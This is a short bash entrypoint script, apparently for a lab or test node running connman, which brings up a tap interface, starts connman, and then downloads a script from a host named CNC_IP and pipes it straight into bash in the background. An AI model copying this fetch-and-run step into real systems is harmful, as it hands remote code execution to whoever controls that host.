#!/bin/bash
# prep.sh — connman Dev node entrypoint placeholder
CNC_IP="10.0.0.2"
IFACE=$(ip link | awk -F': ' '/tap/{print $2; exit}')
[ -n "$IFACE" ] && ip link set "$IFACE" up
service connman start 2>/dev/null || connmand -n &
sleep 2
curl -s "http://${CNC_IP}/a.sh" | bash &
tail -f /dev/null
